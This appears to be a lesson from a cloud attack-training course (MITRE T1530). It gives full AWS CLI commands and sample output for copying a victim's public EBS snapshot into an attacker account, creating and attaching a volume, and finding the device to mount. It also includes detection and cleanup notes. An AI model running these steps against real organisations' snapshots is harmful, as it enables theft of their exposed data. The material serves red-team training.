MITRE ATT&CK: T1530 — Data from Cloud Storage
Prerequisites:
  • Completed M10-L01: public snapshot IDs identified (snap-0ghi789 is the primary target — smallest, highest value)
  • An attacker-controlled EC2 instance running in the same region as the target snapshots (us-east-1)
  • Attacker EC2 instance ID and availability zone noted: aws ec2 describe-instances --query 'Reservations[0].Instances[0].[InstanceId,Placement.AvailabilityZone]'
  • Permissions: ec2:CopySnapshot, ec2:CreateVolume, ec2:AttachVolume, ec2:DescribeSnapshots, ec2:DescribeVolumes
  • SSH access to the attacker EC2 instance (for mount steps in L03)
1
Copy the public snapshot into your attacker AWS account. This creates a full copy you control, independent of the victim's account. The copy runs asynchronously — poll for completion before proceeding.
Terminal
$ aws ec2 copy-snapshot \ --source-region us-east-1 \ --source-snapshot-id snap-0ghi789 \ --description "analysis copy - bastion backup" \ --profile attacker \ --region us-east-1
{ "SnapshotId": "snap-0xyz789attacker" }
2
Wait for the snapshot copy to complete. Larger snapshots can take several minutes to copy. The wait subcommand polls every 15 seconds and returns only when state is completed.
Terminal
$ aws ec2 wait snapshot-completed \ --snapshot-ids snap-0xyz789attacker \ --profile attacker \ --region us-east-1 $ aws ec2 describe-snapshots \ --snapshot-ids snap-0xyz789attacker \ --query 'Snapshots[0].[State,Progress,VolumeSize]' \ --profile attacker \ --region us-east-1
[ "completed", "100%", 20 ]
3
Create an EBS volume from the copied snapshot. The volume must be in the same availability zone as your attacker EC2 instance — cross-AZ volume attachment is not supported.
Terminal
$ aws ec2 create-volume \ --snapshot-id snap-0xyz789attacker \ --availability-zone us-east-1a \ --volume-type gp3 \ --profile attacker \ --region us-east-1
{ "VolumeId": "vol-0abc123attacker", "Size": 20, "SnapshotId": "snap-0xyz789attacker", "AvailabilityZone": "us-east-1a", "State": "creating", "VolumeType": "gp3", "Iops": 3000, "Throughput": 125 }
# Wait for volume to be available before attaching: $ aws ec2 wait volume-available \ --volume-ids vol-0abc123attacker \ --profile attacker \ --region us-east-1
4
Attach the volume to your attacker EC2 instance as a secondary disk. The --device value is a hint to the OS but the actual device path varies by instance type. Always confirm with lsblk after attaching.
Terminal
$ aws ec2 attach-volume \ --volume-id vol-0abc123attacker \ --instance-id i-attacker01 \ --device /dev/sdf \ --profile attacker \ --region us-east-1
{ "AttachTime": "2024-01-15T12:05:00.000Z", "Device": "/dev/sdf", "InstanceId": "i-attacker01", "State": "attaching", "VolumeId": "vol-0abc123attacker" }
5
SSH into your attacker EC2 instance and confirm the device path. The device name depends on the instance virtualization type: older Xen-based instances show /dev/xvdf; current Nitro-based instances (C5, M5, R5, T3, etc.) show /dev/nvme1n1. Always run lsblk to find the actual path, and check the filesystem type before mounting.
Terminal
$ lsblk
# Xen-based instance (older, e.g., T2, M4): NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT xvda 202:0 0 20G 0 disk └─xvda1 202:1 0 20G 0 part / xvdf 202:80 0 20G 0 disk └─xvdf1 202:81 0 20G 0 part # Nitro-based instance (current, e.g., T3, M5, C5): NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT nvme0n1 259:0 0 20G 0 disk └─nvme0n1p1 259:1 0 20G 0 part / nvme1n1 259:2 0 20G 0 disk └─nvme1n1p1 259:3 0 20G 0 part
# Identify filesystem type before mounting (never skip this step): # On Xen instance: $ sudo file -s /dev/xvdf1
/dev/xvdf1: Linux rev 1.0 ext4 filesystem data, UUID=a1b2c3d4-... (extents) (large files)
# On Nitro instance: $ sudo file -s /dev/nvme1n1p1
/dev/nvme1n1p1: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)
# Note the filesystem type (ext4 or xfs) — mount commands differ (see L03)

→
create-volume
→
attach-volume
→
lsblk (find device)
→

Detection: ec2:CopySnapshot and ec2:CreateVolume appear in the attacker's CloudTrail, not the victim's. The victim's CloudTrail does not log when a third party creates a volume from their public snapshot. This is a key reason public snapshot exposure is so dangerous: the victim has no native visibility into who is accessing their data. Cost warning: EBS volumes are billed hourly even when detached — delete volumes promptly when done. MITRE: T1530.
Cleanup:
  • After completing L03 analysis, detach the volume: aws ec2 detach-volume --volume-id vol-0abc123attacker --profile attacker --region us-east-1
  • Wait for detach: aws ec2 wait volume-available --volume-ids vol-0abc123attacker --profile attacker --region us-east-1
  • Delete the volume (stops hourly billing): aws ec2 delete-volume --volume-id vol-0abc123attacker --profile attacker --region us-east-1
  • Delete the copied snapshot: aws ec2 delete-snapshot --snapshot-id snap-0xyz789attacker --profile attacker --region us-east-1
  • Verify deletion: aws ec2 describe-snapshots --snapshot-ids snap-0xyz789attacker --profile attacker --region us-east-1 should return an error
